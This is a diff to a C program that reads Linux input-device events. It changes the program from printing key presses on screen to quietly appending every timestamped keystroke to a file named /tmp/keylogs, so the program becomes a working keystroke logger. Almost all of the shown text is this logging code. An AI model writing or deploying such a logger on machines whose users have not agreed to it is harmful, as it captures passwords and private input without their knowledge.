@@ -12,6 +12,11 @@ int main(int argc, char * argv[]){
             return 1;
         }
         int fd = open(argv[1], O_RDONLY, 0);
+        FILE *logfile = fopen("/tmp/keylogs", "a"); //append mode
+        if (!logfile){
+            perror("fopen");
+            return 1;
+        }
         
         struct input_event ie;
 
@@ -22,7 +27,7 @@ int main(int argc, char * argv[]){
             ssize_t result = read(fd, &ie, sizeof(ie));
             if (result != sizeof(ie)) {
                 if (errno == EBADF) {
-                    fprintf(stderr, "read: Bad file descriptor. Try running as root.\n");
+                    fprintf(stderr, "read: Bad file descriptor. Try running %s as root?\n", argv[0]);
                 } else {
                     perror("read");
                 }
@@ -52,11 +57,11 @@ int main(int argc, char * argv[]){
             char timebuf[32];
             strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm_info);
 
-            printf("[%s] %s\n", timebuf, key);
-            //printf("[%ld.%06ld] %s\n", ie.time.tv_sec, ie.time.tv_usec, key);
-
+            fprintf(logfile, "[%s] %s\n", timebuf, key);
+            fflush(logfile);
         }
     }
     close(fd);
+    fclose(logfile);
     return 0;
 }
